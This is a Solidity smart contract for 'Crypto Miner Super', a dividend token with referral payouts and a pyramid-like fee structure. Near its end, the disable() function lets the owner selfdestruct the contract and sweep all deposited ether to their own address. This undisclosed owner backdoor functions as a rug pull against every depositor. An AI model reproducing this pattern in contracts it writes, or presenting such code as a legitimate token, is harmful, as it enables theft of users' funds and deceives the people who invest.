1 pragma solidity ^0.4.25;
2 
3 /*
4 * Crypto Miner Super concept
5 *
6 * [✓] 5% Withdraw fee
7 * [✓] 15% Deposit fee
8 * [✓] 1% Token transfer
9 * [✓] 35% Referal link
10 *
11 */
12 
13 contract CryptoMinerSuper {
14 
15     address public owner;
16     
17     modifier onlyBagholders {
18         require(myTokens() > 0);
19         _;
20     }
21 
22     modifier onlyStronghands {
23         require(myDividends(true) > 0);
24         _;
25     }
26 
27     event onTokenPurchase(
28         address indexed customerAddress,
29         uint256 incomingEthereum,
30         uint256 tokensMinted,
31         address indexed referredBy,
32         uint timestamp,
33         uint256 price
34 );
35 
36     event onTokenSell(
37         address indexed customerAddress,
38         uint256 tokensBurned,
39         uint256 ethereumEarned,
40         uint timestamp,
41         uint256 price
42 );
43 
44     event onReinvestment(
45         address indexed customerAddress,
46         uint256 ethereumReinvested,
47         uint256 tokensMinted
48 );
49 
50     event onWithdraw(
51         address indexed customerAddress,
52         uint256 ethereumWithdrawn
53 );
54 
55     event Transfer(
56         address indexed from,
57         address indexed to,
58         uint256 tokens
59 );
60 
61     string public name = "Crypto Miner Super";
62     string public symbol = "CMS";
63     uint8 constant public decimals = 18;
64     uint8 constant internal entryFee_ = 15;
65     uint8 constant internal transferFee_ = 1;
66     uint8 constant internal exitFee_ = 5;
67     uint8 constant internal refferalFee_ = 35;
68     uint256 constant internal tokenPriceInitial_ = 0.0000001 ether;
69     uint256 constant internal tokenPriceIncremental_ = 0.00000001 ether;
70     uint256 constant internal magnitude = 2 ** 64;
71     uint256 public stakingRequirement = 50e18;
72     mapping(address => uint256) internal tokenBalanceLedger_;
73     mapping(address => uint256) internal referralBalance_;
74     mapping(address => int256) internal payoutsTo_;
75     uint256 internal tokenSupply_;
76     uint256 internal profitPerShare_;
77     
78     constructor() public 
79     {
80         owner = msg.sender;
81     }
82 
83     function buy(address _referredBy) public payable returns (uint256) {
84         purchaseTokens(msg.value, _referredBy);
85     }
86 
87     function() payable public {
88         purchaseTokens(msg.value, 0x0);
89     }
90 
91     function reinvest() onlyStronghands public {
92         uint256 _dividends = myDividends(false);
93         address _customerAddress = msg.sender;
94         payoutsTo_[_customerAddress] +=  (int256) (_dividends * magnitude);
95         _dividends += referralBalance_[_customerAddress];
96         referralBalance_[_customerAddress] = 0;
97         uint256 _tokens = purchaseTokens(_dividends, 0x0);
98         emit onReinvestment(_customerAddress, _dividends, _tokens);
99     }
100 
101     function exit() public {
102         address _customerAddress = msg.sender;
103         uint256 _tokens = tokenBalanceLedger_[_customerAddress];
104         if (_tokens > 0) sell(_tokens);
105         withdraw();
106     }
107 
108     function withdraw() onlyStronghands public {
109         address _customerAddress = msg.sender;
110         uint256 _dividends = myDividends(false);
111         payoutsTo_[_customerAddress] += (int256) (_dividends * magnitude);
112         _dividends += referralBalance_[_customerAddress];
113         referralBalance_[_customerAddress] = 0;
114         _customerAddress.transfer(_dividends);
115         emit onWithdraw(_customerAddress, _dividends);
116     }
117 
118     function sell(uint256 _amountOfTokens) onlyBagholders public {
119         address _customerAddress = msg.sender;
120         require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);
121         uint256 _tokens = _amountOfTokens;
122         uint256 _ethereum = tokensToEthereum_(_tokens);
123         uint256 _dividends = SafeMath.div(SafeMath.mul(_ethereum, exitFee_), 100);
124         uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);
125 
126         tokenSupply_ = SafeMath.sub(tokenSupply_, _tokens);
127         tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _tokens);
128 
129         int256 _updatedPayouts = (int256) (profitPerShare_ * _tokens + (_taxedEthereum * magnitude));
130         payoutsTo_[_customerAddress] -= _updatedPayouts;
131 
132         if (tokenSupply_ > 0) {
133             profitPerShare_ = SafeMath.add(profitPerShare_, (_dividends * magnitude) / tokenSupply_);
134         }
135         emit onTokenSell(_customerAddress, _tokens, _taxedEthereum, now, buyPrice());
136     }
137 
138     function transfer(address _toAddress, uint256 _amountOfTokens) onlyBagholders public returns (bool) {
139         address _customerAddress = msg.sender;
140         require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);
141 
142         if (myDividends(true) > 0) {
143             withdraw();
144         }
145 
146         uint256 _tokenFee = SafeMath.div(SafeMath.mul(_amountOfTokens, transferFee_), 100);
147         uint256 _taxedTokens = SafeMath.sub(_amountOfTokens, _tokenFee);
148         uint256 _dividends = tokensToEthereum_(_tokenFee);
149 
150         tokenSupply_ = SafeMath.sub(tokenSupply_, _tokenFee);
151         tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
152         tokenBalanceLedger_[_toAddress] = SafeMath.add(tokenBalanceLedger_[_toAddress], _taxedTokens);
153         payoutsTo_[_customerAddress] -= (int256) (profitPerShare_ * _amountOfTokens);
154         payoutsTo_[_toAddress] += (int256) (profitPerShare_ * _taxedTokens);
155         profitPerShare_ = SafeMath.add(profitPerShare_, (_dividends * magnitude) / tokenSupply_);
156         emit Transfer(_customerAddress, _toAddress, _taxedTokens);
157         return true;
158     }
159 
160 
161     function totalEthereumBalance() public view returns (uint256) {
162         return this.balance;
163     }
164 
165     function totalSupply() public view returns (uint256) {
166         return tokenSupply_;
167     }
168 
169     function myTokens() public view returns (uint256) {
170         address _customerAddress = msg.sender;
171         return balanceOf(_customerAddress);
172     }
173 
174     function myDividends(bool _includeReferralBonus) public view returns (uint256) {
175         address _customerAddress = msg.sender;
176         return _includeReferralBonus ? dividendsOf(_customerAddress) + referralBalance_[_customerAddress] : dividendsOf(_customerAddress) ;
177     }
178 
179     function balanceOf(address _customerAddress) public view returns (uint256) {
180         return tokenBalanceLedger_[_customerAddress];
181     }
182 
183     function dividendsOf(address _customerAddress) public view returns (uint256) {
184         return (uint256) ((int256) (profitPerShare_ * tokenBalanceLedger_[_customerAddress]) - payoutsTo_[_customerAddress]) / magnitude;
185     }
186 
187     function sellPrice() public view returns (uint256) {
188         // our calculation relies on the token supply, so we need supply. Doh.
189         if (tokenSupply_ == 0) {
190             return tokenPriceInitial_ - tokenPriceIncremental_;
191         } else {
192             uint256 _ethereum = tokensToEthereum_(1e18);
193             uint256 _dividends = SafeMath.div(SafeMath.mul(_ethereum, exitFee_), 100);
194             uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);
195 
196             return _taxedEthereum;
197         }
198     }
199 
200     function buyPrice() public view returns (uint256) {
201         if (tokenSupply_ == 0) {
202             return tokenPriceInitial_ + tokenPriceIncremental_;
203         } else {
204             uint256 _ethereum = tokensToEthereum_(1e18);
205             uint256 _dividends = SafeMath.div(SafeMath.mul(_ethereum, entryFee_), 100);
206             uint256 _taxedEthereum = SafeMath.add(_ethereum, _dividends);
207 
208             return _taxedEthereum;
209         }
210     }
211 
212     function calculateTokensReceived(uint256 _ethereumToSpend) public view returns (uint256) {
213         uint256 _dividends = SafeMath.div(SafeMath.mul(_ethereumToSpend, entryFee_), 100);
214         uint256 _taxedEthereum = SafeMath.sub(_ethereumToSpend, _dividends);
215         uint256 _amountOfTokens = ethereumToTokens_(_taxedEthereum);
216 
217         return _amountOfTokens;
218     }
219 
220     function calculateEthereumReceived(uint256 _tokensToSell) public view returns (uint256) {
221         require(_tokensToSell <= tokenSupply_);
222         uint256 _ethereum = tokensToEthereum_(_tokensToSell);
223         uint256 _dividends = SafeMath.div(SafeMath.mul(_ethereum, exitFee_), 100);
224         uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);
225         return _taxedEthereum;
226     }
227 
228 
229     function purchaseTokens(uint256 _incomingEthereum, address _referredBy) internal returns (uint256) {
230         address _customerAddress = msg.sender;
231         uint256 _undividedDividends = SafeMath.div(SafeMath.mul(_incomingEthereum, entryFee_), 100);
232         uint256 _referralBonus = SafeMath.div(SafeMath.mul(_undividedDividends, refferalFee_), 100);
233         uint256 _dividends = SafeMath.sub(_undividedDividends, _referralBonus);
234         uint256 _taxedEthereum = SafeMath.sub(_incomingEthereum, _undividedDividends);
235         uint256 _amountOfTokens = ethereumToTokens_(_taxedEthereum);
236         uint256 _fee = _dividends * magnitude;
237 
238         require(_amountOfTokens > 0 && SafeMath.add(_amountOfTokens, tokenSupply_) > tokenSupply_);
239 
240         if (
241             _referredBy != 0x0000000000000000000000000000000000000000 &&
242             _referredBy != _customerAddress &&
243             tokenBalanceLedger_[_referredBy] >= stakingRequirement
244         ) {
245             referralBalance_[_referredBy] = SafeMath.add(referralBalance_[_referredBy], _referralBonus);
246         } else {
247             _dividends = SafeMath.add(_dividends, _referralBonus);
248             _fee = _dividends * magnitude;
249         }
250 
251         if (tokenSupply_ > 0) {
252             tokenSupply_ = SafeMath.add(tokenSupply_, _amountOfTokens);
253             profitPerShare_ += (_dividends * magnitude / tokenSupply_);
254             _fee = _fee - (_fee - (_amountOfTokens * (_dividends * magnitude / tokenSupply_)));
255         } else {
256             tokenSupply_ = _amountOfTokens;
257         }
258 
259         tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
260         int256 _updatedPayouts = (int256) (profitPerShare_ * _amountOfTokens - _fee);
261         payoutsTo_[_customerAddress] += _updatedPayouts;
262         emit onTokenPurchase(_customerAddress, _incomingEthereum, _amountOfTokens, _referredBy, now, buyPrice());
263 
264         return _amountOfTokens;
265     }
266 
267     function ethereumToTokens_(uint256 _ethereum) internal view returns (uint256) {
268         uint256 _tokenPriceInitial = tokenPriceInitial_ * 1e18;
269         uint256 _tokensReceived =
270             (
271                 (
272                     SafeMath.sub(
273                         (sqrt
274                             (
275                                 (_tokenPriceInitial ** 2)
276                                 +
277                                 (2 * (tokenPriceIncremental_ * 1e18) * (_ethereum * 1e18))
278                                 +
279                                 ((tokenPriceIncremental_ ** 2) * (tokenSupply_ ** 2))
280                                 +
281                                 (2 * tokenPriceIncremental_ * _tokenPriceInitial*tokenSupply_)
282                             )
283                         ), _tokenPriceInitial
284                     )
285                 ) / (tokenPriceIncremental_)
286             ) - (tokenSupply_);
287 
288         return _tokensReceived;
289     }
290 
291     function tokensToEthereum_(uint256 _tokens) internal view returns (uint256) {
292         uint256 tokens_ = (_tokens + 1e18);
293         uint256 _tokenSupply = (tokenSupply_ + 1e18);
294         uint256 _etherReceived =
295             (
296                 SafeMath.sub(
297                     (
298                         (
299                             (
300                                 tokenPriceInitial_ + (tokenPriceIncremental_ * (_tokenSupply / 1e18))
301                             ) - tokenPriceIncremental_
302                         ) * (tokens_ - 1e18)
303                     ), (tokenPriceIncremental_ * ((tokens_ ** 2 - tokens_) / 1e18)) / 2
304                 )
305                 / 1e18);
306 
307         return _etherReceived;
308     }
309 
310     function sqrt(uint256 x) internal pure returns (uint256 y) {
311         uint256 z = (x + 1) / 2;
312         y = x;
313 
314         while (z < y) {
315             y = z;
316             z = (x / z + z) / 2;
317         }
318     }
319     
320     function disable()
321         public
322     {
323         require( msg.sender == owner, "ONLY OWNER" );
324         selfdestruct(owner);
325     }
326 
327 
328 }
329 
330 library SafeMath {
331     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
332         if (a == 0) {
333             return 0;
334         }
335         uint256 c = a * b;
336         assert(c / a == b);
337         return c;
338     }
339 
340     function div(uint256 a, uint256 b) internal pure returns (uint256) {
341         uint256 c = a / b;
342         return c;
343     }
344 
345     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
346         assert(b <= a);
347         return a - b;
348     }
349 
350     function add(uint256 a, uint256 b) internal pure returns (uint256) {
351         uint256 c = a + b;
352         assert(c >= a);
353         return c;
354     }
355 }